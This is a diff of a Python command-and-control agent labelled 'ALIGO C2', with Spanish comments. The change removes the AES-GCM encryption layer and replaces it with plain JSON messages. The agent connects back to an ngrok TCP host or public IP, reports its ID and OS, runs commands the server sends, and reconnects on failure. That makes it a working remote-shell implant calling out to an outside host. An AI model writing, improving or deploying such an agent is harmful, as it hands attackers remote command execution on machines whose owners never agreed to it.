@@ -1,19 +1,23 @@
 """
-Agente C2 - Versión para ngrok/Internet (con cifrado AES-GCM)
+Agente C2 - Versión para ngrok/Internet
+CONFIGURADO PARA: Conectarse a servidor via ngrok o IP pública
 
 USO:
-    python3 agent_ngrok_cifrado.py 4.tcp.ngrok.io 15432
-    python3 agent_ngrok_cifrado.py servidor.ejemplo.com 4444
+    python3 agent_ngrok.py 4.tcp.ngrok.io 15432
+    python3 agent_ngrok.py servidor.ejemplo.com 4444
 """
 
 import socket
+import json
 import subprocess
 import platform
 import uuid
 import time
 import sys
 
-from crypto_layer import encrypt_json, decrypt_line
+# ============================================
+# CONFIGURACIÓN FLEXIBLE
+# ============================================
 
 # Valores por defecto (cambiar según tu servidor)
 DEFAULT_HOST = "4.tcp.ngrok.io"  # Cambia esto con tu URL de ngrok
@@ -35,19 +39,20 @@ RECONNECT_DELAY = 5  # segundos antes de reintentar si se cae la conexión
 
 
 def send_json(sock, data: dict):
-    sock.sendall(encrypt_json(data))
+    msg = json.dumps(data) + "\n"
+    sock.sendall(msg.encode())
 
 
-def recv_json(sock, buffer: bytes):
-    while b"\n" not in buffer:
+def recv_json(sock, buffer: str):
+    while "\n" not in buffer:
         chunk = sock.recv(4096)
         if not chunk:
             return None, buffer
-        buffer += chunk
-    line, buffer = buffer.split(b"\n", 1)
+        buffer += chunk.decode(errors="ignore")
+    line, buffer = buffer.split("\n", 1)
     if not line.strip():
         return {}, buffer
-    return decrypt_line(line.decode()), buffer
+    return json.loads(line), buffer
 
 
 def execute_command(command: str) -> str:
@@ -70,8 +75,9 @@ def execute_command(command: str) -> str:
 
 def run_agent():
     print(f"[*] Agente ID: {AGENT_ID}")
-    print(f"[*] Intentando conectar a {SERVER_HOST}:{SERVER_PORT} (canal cifrado AES-GCM)")
-    print("[*] Presiona Ctrl+C para detener\n")
+    print(f"[*] Intentando conectar a {SERVER_HOST}:{SERVER_PORT}")
+    print(f"[*] Presiona Ctrl+C para detener")
+    print()
     
     while True:  # loop de reconexión
         try:
@@ -90,7 +96,7 @@ def run_agent():
                 "os": platform.system(),
             })
 
-            buffer = b""
+            buffer = ""
             while True:
                 msg, buffer = recv_json(sock, buffer)
                 if msg is None:
@@ -112,15 +118,15 @@ def run_agent():
 
         except socket.timeout:
             print(f"[!] Timeout al conectar a {SERVER_HOST}:{SERVER_PORT}")
-            print("[*] ¿Está el servidor corriendo? ¿Es correcta la dirección?")
+            print(f"[*] ¿Está el servidor corriendo? ¿Es correcta la dirección?")
             print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
             time.sleep(RECONNECT_DELAY)
         except socket.gaierror:
             print(f"[!] No se pudo resolver el hostname: {SERVER_HOST}")
-            print("[*] Verifica que la URL sea correcta")
+            print(f"[*] Verifica que la URL sea correcta")
             print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
             time.sleep(RECONNECT_DELAY)
-        except (ConnectionRefusedError, ConnectionResetError, OSError, ValueError) as e:
+        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
             print(f"[!] Error de conexión: {e}")
             print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
             time.sleep(RECONNECT_DELAY)
@@ -131,7 +137,7 @@ def run_agent():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("  ALIGO C2 - Agente (Cifrado)")
+    print("  ALIGO C2 - Agente")
     print("=" * 50)
     print()
     
